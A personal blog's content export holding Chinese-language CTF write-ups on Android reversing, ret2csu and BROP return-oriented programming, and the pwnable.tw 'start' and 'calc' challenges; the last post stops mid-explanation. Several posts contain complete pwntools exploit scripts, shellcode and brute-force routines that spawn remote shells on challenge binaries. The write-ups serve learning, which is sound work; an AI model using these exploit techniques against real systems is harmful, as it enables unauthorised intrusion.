{"meta":{"title":"Bin Fantasy🤯","subtitle":"You may found nothing here.","description":"","author":"Ash3n On3","url":"http://example.com","root":"/"},"pages":[{"title":"Tags","date":"2021-03-23T11:22:39.430Z","updated":"2020-10-03T09:03:26.452Z","comments":true,"path":"tags/index.html","permalink":"http://example.com/tags/index.html","excerpt":"","text":""},{"title":"categories","date":"2020-10-03T09:03:26.452Z","updated":"2020-10-03T09:03:26.452Z","comments":true,"path":"categories/index.html","permalink":"http://example.com/categories/index.html","excerpt":"","text":""}],"posts":[{"title":"Android Re","slug":"Android Re","date":"2020-10-30T12:14:08.000Z","updated":"2021-03-23T08:37:09.266Z","comments":true,"path":"2020/10/30/Android Re/","link":"","permalink":"http://example.com/2020/10/30/Android%20Re/","excerpt":"​ 安卓逆向入门入门。","text":"​ 安卓逆向入门入门。最近可算开始学安卓逆向了，先刷刷jarvis oj上的题康康。 0x00 . Smail​ 题目只给了一个.smail文件。smail是Davlik虚拟机的寄存器语言，相当于pc平台的汇编语言，可以看出个大概逻辑。 ​ 不过当然可以借助Smail2java工具，将其转换成.java文件。 ​ java如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445package net.bluelotus.tomorrow.easyandroid;import android.util.Base64;import java.io.PrintStream;import java.security.NoSuchAlgorithmException;import javax.crypto.NoSuchPaddingException;import java.security.InvalidKeyException;import javax.crypto.IllegalBlockSizeException;import javax.crypto.BadPaddingException;import javax.crypto.spec.SecretKeySpec;import javax.crypto.Cipher;import java.security.Key;import java.security.GeneralSecurityException;public class Crackme &#123; private String str2 = &quot;cGhyYWNrICBjdGYgMjAxNg==&quot;; public Crackme() &#123; GetFlag(&quot;sSNnx1UKbYrA1+MOrdtDTA==&quot;); &#125; private String GetFlag(String p1) &#123; byte[] &quot;content&quot; = Base64.decode(p1.getBytes(), 0x0); String &quot;kk&quot; = new String(Base64.decode(str2.getBytes(), 0x0)); System.out.println(decrypt(&quot;content&quot;, &quot;kk&quot;)); return null; &#125; private String decrypt(byte[] p1, String p2) &#123; String &quot;m&quot; = 0x0; try &#123; byte[] &quot;keyStr&quot; = p2.getBytes(); SecretKeySpec &quot;key&quot; = new SecretKeySpec(&quot;keyStr&quot;, &quot;AES&quot;); Cipher &quot;cipher&quot; = Cipher.getInstance(&quot;AES/ECB/NoPadding&quot;); &quot;cipher&quot;.init(0x2, &quot;key&quot;); byte[] &quot;result&quot; = &quot;cipher&quot;.doFinal(p1); return &quot;m&quot;; &#125; catch(NoSuchPaddingException &quot;e&quot;) &#123; &quot;e&quot;.printStackTrace(); &#125; return &quot;m&quot;; &#125;&#125; ​ 一开始一直在纠结Cipher.getInstance啥的看不懂，然后打算丢去eclipse或者Android Studio直接跑但是碰到一堆编译问题，十分头疼。看了看解析，原来只要明白是AES加密就可以了（果然逆向还是得专注关键代码），于是用python解码： 123456import base64from Crypto.Cipher import AEScode = base64.b64decode(&quot;sSNnx1UKbYrA1+MOrdtDTA==&quot;)key = base64.b64decode(&quot;cGhyYWNrICBjdGYgMjAxNg==&quot;)aes=AES.new(key,AES.MODE_ECB)print aes.decrypt(code) 0x01 . 爬楼梯​ 安装apk并打开，是一个爬楼小游戏，点击按钮爬楼，爬到了就能看flag。 ​ 看到这第一时间想到了八门神器，直接给root权限然后修改已爬楼层就完事。但是莫名其妙的是八门神器好像不适配模拟器的安卓版本（7.1.2），模拟器已经分配了超级用户权限，但是打开八门依旧提示没有root权限。 ​ 于是反汇编apk，研究研究逻辑。 ​ 确实是爬到楼层即可看flag，不过楼层数每次打开都是个随机数，该随机数要对32进行取余，因此有一定概率在打开后发现楼层数为0，可以直接拿flag。 ​ 不过还是采用专业办法，用mt管理器解压，Dex编辑器查看dex文件。 ​ ​ 接着找到MainActivity()。 ​ 发现第一行处v5被初始化为0，8-9行处用v5初始化v0，然后将v0的值用作参数调用flag组件的 setClickable()函数。也就是说将v5初始化值改为1即可使得flag组件一直处于clickable。 ​ 改了之后在右上角点击保存，退出再保存一次，然后一路退出。 ​ ​ 然后全选(左右划动选择)，长按压缩，选择apk模式。 ​ 然后长按CFF.apk，功能-apk签名。 ​ 然后安装，拿到flag。 0x02 . FindPass​ 模拟器安装apk打开瞅瞅。 ​ jeb反编译apk瞅瞅。 ​ 比较输入的字符串(v5)和v4是否一致，一致则得到flag。 ​ 在运行过程中，v4必然会存储到内存中，因此我们可以动调查看。在模拟器文件夹打开终端，输入以下命令，得到模拟器端口号。 ​ 然后再用系统的adb连接上端口。 ​ 在模拟器打开app，然后在jeb打开调试器，选择开始调试，就可以找到模拟器的进程。 ​ 附上之后开始调试。 ​ 发现报错，原来是apk设置成了不可调试。用apktools反编译出来，然后修改xml，在application标签中加上**android:debuggable=”true”**并用空格隔开。 ​ 重新调试，在标签90处下断点，已知v9中存的就是v4的flag。 ​ 查看局部变量列表，即可发现flag。","categories":[],"tags":[]},{"title":"Intermediate ROP","slug":"Intermediate ROP","date":"2020-08-19T14:19:07.000Z","updated":"2021-03-23T08:38:07.535Z","comments":true,"path":"2020/08/19/Intermediate ROP/","link":"","permalink":"http://example.com/2020/08/19/Intermediate%20ROP/","excerpt":"​ Ret2csu &amp; BROP","text":"​ Ret2csu &amp; BROP 0x00 . ret2csuA . 原理​ 这个技术算是一个通用的rop技术，用到了__libc_csu_init()这个函数，只要程序调用了库函数就一定需要调用这个函数对库进行初始化。 ​ 写一个简单demo： 1234567891011121314//level5.c#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;void vulnerable_function() &#123; char buf[128]; read(STDIN_FILENO, buf, 512);&#125;int main(int argc, char** argv) &#123; write(STDOUT_FILENO, &quot;Hello, World\\n&quot;, 13); vulnerable_function();&#125; ​ 关闭canary，关闭pie进行64位编译。然后利用objdump命令，可以看到各个段反汇编的情况： 12gcc -fno-stack-protector -no-pie level5.c -o level5objdump -d level5 ​ 仔细观察这个函数，我们可以发现一下有用的gadget： ​ 如果我们能构造rop链，使得系统先执行1，再执行2，那么就可以控制rdi，rsi，rdx三个寄存器。在1处，我们发现了6个弹栈操作，系统将栈上数据储存到寄存器中，而后在2处我们又通过这些寄存器给rdi，rsi，rdx进行了赋值。 ​ 因为反汇编的偏差，在ida中看0x4005D9，发现系统随后调用了rbx*8+r12这个地址。我们可以通过控制这两个寄存器来控制调用地址，进而实现攻击或者数据泄露。 ​ 完整流程如下： 程序通过溢出跳转到1开始执行。 程序执行到0x4005F4处的ret，返回到我们通过溢出而预设的返回地址，即2处。 程序从2处一直往下执行，0x4005D9处调用完函数后返回到0x4005DD继续执行。 执行0x4005DD，使得rbx寄存器+1，接着比较rbx，rbp，如果相等则不跳转，接着往下执行。因此这里我们需要预设寄存器的值使得rbx，rbp满足不跳转的条件。也就是要让rbx+1 == rbp。 再次执行到0x4005F4处的ret，rop链结束。 ​ 当然，该技术也有一些需要注意的点： 0x4005D6中的赋值只是对edi赋值，也就是说仅改变了rdi寄存器的低32位，如果rdi本身数值过大，则需要另外找gadget。 为了让rbx+1 == rbp，我们可以简单地设置让rbx = 0，rbp = 1。 因为需要两次经过1处，所以后一次经过的时候也需要设置6个寄存器的值(垃圾值即可)，然后再加上最后的返回地址，来避免程序崩溃。 B . 示例​ 用level5解题进行演示。 ​ 既然有gadget了，那么思路就比较清晰了： 通过ret2csu设置rbx为0，rbp为1，r12为需要执行的函数地址，r13，r14，r15，分别为r12函数的参数，ret设置返回地址，比如main。 第一次ret2csu，将write_got写入rop链，泄露出write的真实地址，再计算libc和其他所需地址。 第二次ret2csu，将read_got写入rop链，将system地址和”/bin/sh”字符串写入到bss段。 第三次ret2csu，将bss_addr写入rop链，参数为bss_addr + 8，则执行execve(“/bin/sh”,0,0); ​ 当然，最后一次ret2csu，用system函数也是可以的。不过我貌似没成功。而且理论上直接调用execve地址就完了，没必要写在bss上，但是实际操作上却行不懂。暂时存疑。 Exploit 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849from pwn import *context.log_level = &#x27;debug&#x27;p = process(&quot;./level5&quot;)elf = ELF(&quot;./level5&quot;)libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;) #&quot;ldd level5&quot; to figuer out the libc versionread_got = elf.got[&#x27;read&#x27;]write_got = elf.got[&#x27;write&#x27;]bss_addr = 0x601038main_addr = 0x400558write_offset = libc.symbols[&#x27;write&#x27;]execve_offset = libc.symbols[&#x27;execve&#x27;]print execve_offsetdef csu(rbx,rbp,r12,r13,r14,r15,ret): payload = 136*&#x27;A&#x27; payload += p64(0x4005e6)# gadget1 modify r13,r14,r15 payload += p64(0) # padding payload += p64(rbx) # rbx payload += p64(rbp) # rbp payload += p64(r12) # call addr payload += p64(r13) # rdi payload += p64(r14) # rsi payload += p64(r15) # rdx payload += p64(0x4005d0) # gadget2 modify rdi,rsi,rdx payload += &#x27;A&#x27;*0x38 # padding again for register payload += p64(ret) # ret p.sendline(payload) p.recvuntil(&quot;Hello, World&quot;)csu(0,1,write_got,1,write_got,8,main_addr)temp = p.recv(8)#write_addr = u64(temp.ljust(8,&#x27;\\x00&#x27;))write_addr = 0x7ffff7af4140print &quot;here is write_addr:&quot; +hex(write_addr)libc_addr = write_addr - write_offsetexecve_addr = libc_addr + execve_offsetprint &quot;Now we know the execve_addr:&quot;,print execve_addrbin_addr = libc_addr + next(libc.search(&#x27;/bin/sh&#x27;))p.recvuntil(&quot;Hello, World&quot;)csu(0,1,read_got,0,bss_addr,16,main_addr)p.send(p64(execve_addr) + &quot;/bin/sh\\x00&quot;)#gdb.attach(p) #To see if you write the data successfullyp.recvuntil(&quot;Hello, World&quot;)csu(0,1,bss_addr,bss_addr+8,0,0,execve_addr)p.interactive() C . 小技巧​ 我们直接看__libc_csu_init()发现0x4005ea到0x4005f3并不是每个字节各表示一条汇编语句，有几句占了两个字节。 ​ 然而直接看0x4005ed的话，我们会发现此处的汇编语句是pop rsp; ​ 0x4005efc处是pop rbp; ​ 还有pop rsi和pop rdi。 ​ 通过偏移我们可以找到不少gedget。 0x01 . BROPA . 原理​ 这个技术挺🐂🍺的。是几个斯坦福大学的师傅在公元2014年发表的论文中提出的一项ROP技术，也有通俗的ppt。 ​ BROP就是blink rop，是指没有源程序源代码的情况下(一般是只允许远程连接)进行rop并且getshell。方法就是通过有限数据对程序结构进行合理猜测以及进行适当的爆破。 ​ 适用条件如下： 存在栈溢出 进程崩溃后自行重新启动，并且重启后各地址与之前进程地址一致。 ​ 攻击步骤如下： 确定溢出长度。 寻找可行返回地址。 寻找gadget。 确定plt表。 确定got表。 泄露部分程序二进制数据。 确定libc并进行攻击。 ​ 以下结合 HCTF2016 的出题人失踪了一题逐步解释，通过本地docker进行远程攻击。 1 . 确定溢出长度​ 我们需要确定溢出点到返回地址的距离，通过爆破可以实现。在i逐渐递增时，如果某一个i的值使得程序发生EOF错误，就说明溢出长度超过了返回地址，那么i-1则可以视作溢出长度。 123456789101112131415161718def find_length(): i = 1 while 1: try: p = remote(&quot;127.0.0.1&quot;,10000) p.recvuntil(&quot;\\n&quot;) p.send(&#x27;a&#x27; * i) output = p.recv() print output p.close() if not output.startswith(&quot;No password&quot;): return i-1 else: i+=1 except EOFError: p.close() return i-1length = 72 2.寻找可行返回地址​ 这里说的返回地址，是填充在rop链末端以便控制返回用的。大概是类似main()函数之类的位置，用来控制流程。 ​ 要寻找可行返回地址(stop_addr)很简单，在知道溢出长度的情况下，只要从0x400000开始爆破，如果找到某一个addr能成功让程序返回main()函数，就说明这个地址可行。 123456789101112131415161718def fine_stop(): addr = 0x400556 while addr&lt;0xffffff: try: p = remote(&quot;127.0.0.1&quot;,10000) p.recvuntil(&quot;\\n&quot;) p.send(&#x27;a&#x27; * length + p64(addr)) p.recv() p.close() print &quot;===================&quot; print &quot;This addr might work : %x&quot;%addr print &quot;===================&quot; addr+=1 except Exception: print &quot;%x--Nah&quot;%addr addr+=1 p.close()stop_gadget = 0x4006b6 ​ 这样找出来的地址可能有不少，我们挑一个就行。 ​ 这里我们为了方便，直接让stop_addr = 0x4006B6，也就是main()函数的地址。 3.寻找gadget​ 又叫stack reading，旨在寻找可行的pop_ret语句，完成对于寄存器的修改。 ​ 我们知道，栈上的数据布局正常来说是这样的。 1padding|canary|parameters&#x2F;pop_ret|saved returned address ​ 所以总的来说，能够使程序顺利执行的rop链基本上有如下2种结构： 1payload = padding + return addr 1payload = padding + canary + pop_ret + arg1 + ... ... + argn + return addr ​ 如果我们要找pop_ret语句，爆破第二个payload即可。控制arg的数量为n个，就可以找出pop出n个寄存器的语句。该题中，我们找ret2csu中的 1234567pop rbx;pop rbp;pop r12;pop r13;pop r14;pop r15;ret; ​ 则使用如下payload： 1payload = padding + pop_ret + p64(0) * 6 + return addr ​ 如果爆破得到了一个pop_ret顺利使得程序返回到了main()就说明它有可能是我们要找的地址。 ​ 我们还需要测试，如果不按套路给予寄存器足够的值，程序会不会崩溃： 1payload = padding + pop_ret + p64(0) * 10 ​ 如果程序崩溃，那么说明pop_ret确实是我们要找的地址，因为上述payload使其返回到了地址0x0000。 1234567891011121314151617181920212223242526272829303132333435363738394041def fine_csu(): addr = 0x4007a0 while 1: try: print &quot;%x connecting...&quot;%addr p = remote(&quot;127.0.0.1&quot;,10000) p.recvuntil(&quot;\\n&quot;) payload = &#x27;a&#x27; * length #now try the rop_chain payload+=p64(addr) #ret of vuln_func(may be) payload+=p64(1) + p64(2) +p64(3) + p64(4) + p64(5) +p64(6) payload+=p64(stop_gadget) #ret of pop_ret p.send(payload) output = p.recv() p.close() if not output.startswith(&quot;WelCome&quot;): #which means we fault to return to the main() successfully print &quot;%x doesn&#x27;t working...&quot;%addr addr+=1 continue else: try: #Here we need to test the addr p = remote(&quot;127.0.0.1&quot;,10000) p.recvuntil(&quot;\\n&quot;) payload = &#x27;a&#x27; * length payload+=p64(addr) payload+=p64(0)*10 #the given addr 0x00000000 would be unreachable for the process p.send(payload) output = p.recv() p.close() print &quot;Fake addr : %x&quot;%addr #The addr couldn&#x27;t be the pop_ret we need if the process exit successfully continue except Exception: #If the program crashes,we can be sure that we got the right gadget addr print &quot;We found!!! The addr is : %x&quot;%addr return 1 except EOFError: print &quot;%x caused a EOF error...&quot;%addr p.close() addr+=1 continuecsu_pop_ret = 0x4007bapop_rdi = csu_pop_ret + 9pop_rsi = csu_pop_ret +7 4 . 确定plt表​ 一般来说这里找的是输出函数的plt表，例如write和puts。 ​ 因为我们不知道程序中有啥数据有啥字符串，所以我们用0x400000当作输出的地址，ELF文件的开头是”\\x7fELF”，只要爆破出某个地址能成功输出”\\x7fELF”，我们就能确定找到了正确的输出函数。 1234567891011121314151617181920212223242526def find_puts_plt(): addr = 0x400554 while 1: try: p = remote(&quot;127.0.0.1&quot;,10000) p.recvuntil(&quot;\\n&quot;) payload = &#x27;a&#x27; * length payload+=p64(pop_rdi) payload+=p64(0x400000) #This addr is &quot;\\x7fELF&quot; payload+=p64(addr) payload+=p64(stop_gadget) p.send(payload) output = p.recv() p.close() if output.startswith(&quot;\\x7fELF&quot;): print &quot;We got the puts_plt : %x&quot;%addr return 0 else: print &quot;%x doesn&#x27;t make sence...&quot;%addr addr += 1 continue except Exception: print &quot;%x cause some error...&quot;%addr addr += 1 continueputs_plt = 0x400560 5 . 泄露部分程序二进制数据，确定got表​ 此时我们掌握了puts_plt，可以实现任意读。 ​ 但是我们的目的是找到libc。众所周知plt表项指向的是got表，got表则指向libc的真实地址。 ​ 所以我们还需要找到puts_got。 ​ 那么为了获取更多信息，我们读一段ELF上的数据，并且通过二进制方式写入到新的文件中。 123456789101112131415161718192021222324252627def dump_file(): fi = open(&quot;code&quot;,&quot;wb&quot;) result = &quot;&quot; addr = 0x400000 while addr &lt; 0x401000: p = remote(&quot;127.0.0.1&quot;,10000) print &quot;%x connecting ...&quot;%addr try: p.recvuntil(&quot;WelCome my friend,Do you know password?\\n&quot;) payload = &#x27;a&#x27; * length + p64(pop_rdi) + p64(addr)+ p64(puts_plt)+ p64(stop_gadget) p.send(payload) data = p.recv() p.close() try: data = data[:data.index(&quot;\\nWelCome&quot;)] except Exception: data = data if data == &quot;&quot;: data = &#x27;\\x00&#x27; result += data addr += len(data) except Exception: p.close() continue print result fi.write(result)puts_got = 0x601018 ​ 通过编辑-段-设置基址，设置0x400000为基址，然后找到0x400560(第4步中得出的plt地址)。 ​ c键转换成代码。 ​ 看到此处代码跳转到了0x601018，因此这个就是puts_got。 6 . 确定libc并进行攻击​ 找到了puts_got之后，再通过LibcSearcher找到对应的libc版本(可能有多个)，然后就再leak出system的地址和bin字符串的地址，即可完成攻击。 12345678910111213141516def attack(): p = remote(&quot;127.0.0.1&quot;,10000) p.recvuntil(&quot;\\n&quot;) payload = &#x27;a&#x27; * length + p64(pop_rdi) + p64(puts_got)+ p64(puts_plt)+ p64(stop_gadget) #We can leak the real addr of puts in the libc p.send(payload) output = p.recv() output = output[:output.index(&quot;\\nWelCome&quot;)].ljust(8,&#x27;\\x00&#x27;) puts_addr = u64(output) print hex(puts_addr) libc = LibcSearcher(&#x27;puts&#x27;,puts_addr) libc_base = puts_addr - libc.dump(&#x27;puts&#x27;) sys_addr = libc_base + libc.dump(&#x27;system&#x27;) bin_addr = libc_base + libc.dump(&#x27;str_bin_sh&#x27;) payload = &#x27;a&#x27; * length + p64(pop_rdi) + p64(bin_addr)+ p64(sys_addr)+ p64(stop_gadget) p.send(payload) p.interactive() ​","categories":[],"tags":[]},{"title":"Pwnable.tw (start & calc)","slug":"pwnable","date":"2020-07-25T00:19:47.000Z","updated":"2021-03-23T08:38:37.366Z","comments":true,"path":"2020/07/25/pwnable/","link":"","permalink":"http://example.com/2020/07/25/pwnable/","excerpt":"​ 最近边看书边刷pwnable.tw，记录一下write up。","text":"​ 最近边看书边刷pwnable.tw，记录一下write up。 0x00 . startA . Analysis​ 之前看这个题的时候一脸懵逼，事隔经年感觉貌似能做。。。 ​ 程序里只有一个浓眉大眼的start函数： ​ 其实差不多是这两行代码，一个输出一个输入。 123esp = &quot;Let&#x27;s start the CTF:&quot;;write(1,esp,0x14);read(0,esp,0x3C); ​ 而且没NX保护： ​ 那果断shellcode呗。虽然不知道栈底的位置，但可以找到start函数结束时执行了”add esp,14h”的汇编语句，可以猜测栈的大小为0x14，因为栈顶就是我们输入字符串的地方，所以padding的大小也是这么多。 ​ 不过第一次输入时，要先返回到0x08048087这个地址，此时栈帧已经收回，再一次执行write(1,esp,0x14)，就能leak出栈底地址了。 ​ 第二次输入，再将返回地址改成栈底+0x14，也就是shellcode的开头地址，即可执行shellcode。 ​ 然后开始写shellcode： 12345678xor ecx,ecx;xor edx,edx;push ecx; #字符串结尾 push 0x68732f6e; #&#x27;n/sh&#x27;push 0x69622f2f; #&#x27;//bi&#x27;mov ebx,esp;mov eax,0xb;int 0x80; ​ 然后python转机器数： 12shellcode = &quot;xor ecx,ecx;xor edx,edx;push ecx;push 0x68732f6e;push 0x69622f2f;mov ebx,esp;mov eax,0xb;int 0x80;&quot;shellcode = asm(shellcode) ​ 然后跑payload： 12345678910111213141516171819202122232425262728from pwn import *#p = process(&quot;./start&quot;)p = remote(&#x27;chall.pwnable.tw&#x27;,10000)p.recvuntil(&quot;:&quot;)payload = &#x27;A&#x27;*20 + p32(0x08048087)p.send(payload)stack_addr = u32(p.recv(4)) print &quot;Here is addr:&quot;+hex(stack_addr)&#x27;&#x27;&#x27;asm:xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f;mov ebx,esp;mov eax,0xb;int 0x80;&#x27;&#x27;&#x27;#shellcode=&#x27;\\x31\\xc9\\xf7\\xe1\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80&#x27;shellcode = asm(&#x27;xor ecx,ecx;xor edx,edx;push edx;push 0x68732f6e;push 0x69622f2f ;mov ebx,esp;mov eax,0xb;int 0x80&#x27;)payload = &#x27;A&#x27;*0x14 + p32(stack_addr+0x14)+shellcodep.send(payload)p.interactive() 0x01 . calcA . Analysis​ 例行公事如下： ​ 主要的函数是calc()，分别又实现了get_expr(),init_pool(),parse()三个函数。 ​ get_expr()接受用户输入计算表达式，并过滤掉除了“+-*、%0123456789”之外的字符，init_pool()申请堆块来存放数组并且初始化，程序中的若干个运算数就被存放在这个数组中，parse()进行表达式的解析并且运算。 ​ 主要来看看parse函数的执行机制： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384signed int __cdecl parse_expr(int str, _DWORD *num)&#123; int v2; // ST2C_4 int v4; // eax int v5; // [esp+20h] [ebp-88h] int i; // [esp+24h] [ebp-84h] int j; // [esp+28h] [ebp-80h] char *s1; // [esp+30h] [ebp-78h] int v9; // [esp+34h] [ebp-74h] char operator[100]; // [esp+38h] [ebp-70h] unsigned int v11; // [esp+9Ch] [ebp-Ch] v11 = __readgsdword(0x14u); v5 = str; j = 0; bzero(operator, 0x64u); for ( i = 0; ; ++i ) &#123; if ( (*(i + str) - &#x27;0&#x27;) &gt; 9 ) &#123; v2 = i + str - v5; s1 = malloc(v2 + 1); memcpy(s1, v5, v2); s1[v2] = 0; if ( !strcmp(s1, &quot;0&quot;) ) &#123; puts(&quot;prevent division by zero&quot;); fflush(stdout); return 0; &#125; v9 = atoi(s1); if ( v9 &gt; 0 ) &#123; v4 = (*num)++; num[v4 + 1] = v9; &#125; if ( *(i + str) &amp;&amp; (*(i + 1 + str) - &#x27;0&#x27;) &gt; 9 ) &#123; puts(&quot;expression error!&quot;); fflush(stdout); return 0; &#125; v5 = i + 1 + str; if ( operator[j] ) &#123; switch ( *(i + str) ) &#123; case &#x27;%&#x27;: case &#x27;*&#x27;: case &#x27;/&#x27;: if (operator[j] != &#x27;+&#x27; &amp;&amp; operator[j] != &#x27;-&#x27; ) &#123; eval(num, operator[j]); operator[j] = *(i + str); &#125; else &#123; operator[++j] = *(i + str); &#125; break; case &#x27;+&#x27;: case &#x27;-&#x27;: eval(num, operator[j]); operator[j] = *(i + str); break; default: eval(num, operator[j--]); break; &#125; &#125; else &#123; operator[j] = *(i + str); &#125; //Check Point if ( !*(i + str) ) break; &#125; &#125; while ( j &gt;= 0 ) eval(num, operator[j--]); return 1;&#125; ​ 大意是遍历每个字符，把每个运算数保存在num数组(此处num的传参是int型，因此后面数组赋值均用指针寻址)，而且从下标[1]开始保存，num[0]则用来实时保存操作数的个数。每一个运算符被存于operator数组中。 ​ 在瞅瞅实际用来进行运算的eval()函数： ​ 运算方式为:用num[0]当作下标找对应的运算数，再将其与前面的运算数(即num[num[0]-1])进行计算，结果返回到后者。 ​ 举例：输入1+3时，num[0] = 2，num[1] = 1，num[2] = 3 ​ 运算之后：num[0] = 1，num[1] = 4。 ​ 而且parse函数中的检查点会检查num[0]是否为0。 ​ 而这题的漏洞点在eval函数里。函数中规定最后一个运算数与前者进行运算，但是没有考虑过第一个运算数不存在的情况。 ​ 举例：输入+300时，num[0] = 1，num[1] = 300，执行如下代码： 1234 num[*num - 1] += num[*num];// num[num[0]-1] += num[num[0]]// num[1-1] += num[1]// num[0] += num[1] ​ 也就是说，我们输入的300，那么301会被存放在num[0]中，但是num[0]运算结束后-1，因此仍然是300。而在函数calc中我们知道，num[i-1]会被。printf输出，而calc中的i相当于parse和eval中的num[0]。最后输出的是calc函数中的num[299]，相当于输出了parse中的num[300]。所以说，”+x”句式可以达成栈上的任意读。 ​ 再举例：输入+300+1024时，num[0] = 2，num[1] = 300，num[2] = 1024，但是上面我们说过，第一步运算结束后，num[0]为302，自减后为301，因此之后会执行如下代码： 1234 num[*num - 1] += num[*num];// num[num[0]-1] += num[num[0]]// num[301-1] += num[2]// num[300] += num[2] ​ 所以我们在num[2]中写的东西，都会被加到num[300]里面。这里的num[1]和num[2]都可控，也就实现了栈上任意地址写。 B . Attack​ 虽然程序在栈上开启了canary，但是上述的任意地址写是定向的，不会破坏canary。程序还开启了栈上不可执行保护，因此我们需要通过syscall调用execve。 ​ 0x5A0÷4 = 360，所以num[0]到calc函数的栈底为360个单位。栈上结构大致如下： ​ stack of main上面都属于calc的栈帧。而我们要改写的rop链和栈结构如下： ​ 其他的改写都比较简单，重点在于“/bin/sh”字符串，要让函数成功调用，就不能让他属于calc函数和execve函数的栈帧中，以免被清空。所以写在了int 80地址的后面。 ​ 那么如何求出这个地址呢？由上图我们可以看出calc栈帧中的old ebp我们也可以读出来，因为调用calc的上层函数是main，所以这个old ebp就是main函数的ebp。于是我们知道了栈底。不过这个ebp指向的确切位置我们不知道，因此只能再找找其他偏移。在main函数的汇编代码中，我们还可以求出esp的值。 ​ 那么我们可以进而求出main函数的栈帧大小为ebp-esp+4，因为ebp和esp所在的单位都算main函数的栈帧，因此需要加4。 ​ 知道main_size之后，再用ebp - main_size，就求出了main函数的栈顶，或者说calc栈底向下的一个单位，也就是num[361]的位置。而我们知道bin语句的地址在num[368]，因此ebp - main_size + 4*8就是我们要输入”/bin/sh”的地址。 C . Exploit12345678910111213141516171819202122232425262728293031323334from pwn import *#context.log_level = &#x27;debug&#x27;#p = process(&quot;./calc&quot;)p = remote(&quot;chall.pwnable.tw&quot;,10100)int80_addr = 0x08049a21pop_eax = 0x0805c34bpop_edx = 0x0804848fpop_ecx_pop_ebx = 0x080701d1stack = [pop_eax,0xB,pop_edx,0,pop_ecx_pop_ebx,0,0,int80_addr,u32(&quot;/bin&quot;),u32(&quot;/sh\\x00&quot;)]print p.recv()p.sendline(&quot;+360&quot;)i=p.recv()ebp = int(i)+0x100000000esp = (ebp&amp;0xFFFFFFF0)-0x10main_size = ebp - esp + 4print main_sizerop_size = 4*8stack[6] = int(i)-main_size+rop_sizei = 0for i in range(0,10): index = 361 + i p.sendline(&quot;+&quot;+ str(index)) data = int(p.recvline()) if( stack[i]&gt;data): p.sendline(&quot;+&quot;+str(index)+&quot;+&quot;+str(stack[i]-data)) else: p.sendline(&quot;+&quot;+str(index)+str(stack[i]-data)) result = int(p.recvline()) print &quot;num[&quot;+str(index)+&quot;] : &quot;+str(hex(result))p.sendline(&quot;halo....&quot;)p.interactive() ​ 最后还得sendline一下才能getshell。","categories":[],"tags":[]},{"title":"5space (of-twice复现)","slug":"2020 5space","date":"2020-07-13T12:14:08.000Z","updated":"2021-03-23T08:36:07.306Z","comments":true,"path":"2020/07/13/2020 5space/","link":"","permalink":"http://example.com/2020/07/13/2020%205space/","excerpt":"​ 6月份的第五空间，依然啥也没做出来，不仅如此，复现还复现了好几天，算是大致上弄明白思路了。记录一下以后复习用。","text":"​ 6月份的第五空间，依然啥也没做出来，不仅如此，复现还复现了好几天，算是大致上弄明白思路了。记录一下以后复习用。 0x00 . of​ 题目直接给的就是一个.c的源码，看源码remote解题。源码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138#include&lt;stdlib.h&gt;#include&lt;stdio.h&gt;#include&lt;unistd.h&gt;#define NUM 0x10char* chunks[NUM];unsigned long cookie;#define SIZE 0x100void init_io()&#123; setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); setvbuf(stderr, 0, 2, 0); int fd = open(&quot;/dev/urandom&quot;, 0); if(fd == -1) &#123; exit(-1); &#125; read(fd, &amp;cookie, 8); close(fd);&#125;unsigned long get_int()&#123; unsigned long res; scanf(&quot;%ld&quot;, &amp;res); return res;&#125;void allocate()&#123; unsigned long idx; printf(&quot;Index: &quot;); idx = get_int(); if(idx &gt;= NUM)&#123; return ; &#125; char* buf = malloc(SIZE); if(buf == NULL)&#123; puts(&quot;allocate failed&quot;); return; &#125; chunks[idx] = buf; unsigned long* p = chunks[idx] + SIZE - 8; *p = cookie; puts(&quot;Done!&quot;);&#125;void delete()&#123; unsigned long idx; printf(&quot;Index: &quot;); idx = get_int(); if(idx &gt;= NUM || chunks[idx] == NULL)&#123; return ; &#125; unsigned long* p = chunks[idx] + SIZE - 8; if(*p != cookie) return; *p = 0; free(chunks[idx]);&#125;void show()&#123; unsigned long idx; printf(&quot;Index: &quot;); idx = get_int(); if(idx &gt;= NUM || chunks[idx] == NULL)&#123; return ; &#125; unsigned long* p = chunks[idx] + SIZE - 8; if(*p != cookie) return; write(1, &quot;Content: &quot;, strlen(&quot;Content: &quot;)); write(1, chunks[idx], SIZE - 8); write(1, &quot;\\n&quot;, 1);&#125;void edit()&#123; unsigned long idx; printf(&quot;Index: &quot;); idx = get_int(); if(idx &gt;= NUM || chunks[idx] == NULL)&#123; return ; &#125; unsigned long* p = chunks[idx] + SIZE - 8; if(*p != cookie) return; printf(&quot;Content: &quot;); read(0, chunks[idx], SIZE);&#125;void menu()&#123; puts(&quot;1. allocate&quot;); puts(&quot;2. edit&quot;); puts(&quot;3. show&quot;); puts(&quot;4. delete&quot;); puts(&quot;5. exit&quot;); printf(&quot;Your choice: &quot;);&#125;int main()&#123; init_io(); puts(&quot;Made on Ubuntu 18.04&quot;); while(1) &#123; menu(); unsigned long choice = get_int(); switch(choice) &#123; case 1: allocate(); break; case 2: edit(); break; case 3: show(); break; case 4: delete(); break; case 5: exit(0); break; default: puts(&quot;Unknown&quot;); break; &#125; &#125; return 0;&#125; ​ 看上去是个heap题，而且没有double free，但是有UAF。不过这个题目在每一个chunk中塞进了一个cookies，cookies随机生成，所以说如果要泄露起来就会很麻烦。不过看了不少write up，都说这题在部署上有点问题，remote过去不存在cookies的。所以可以正常思路直接写。 ​ 用UAF可以泄露出libc基质，改写free_hook或者malloc_hook，使其指向system，再free掉写着”/bin/sh”的堆，就相当于执行了system(“/bin/sh”)。 ​ 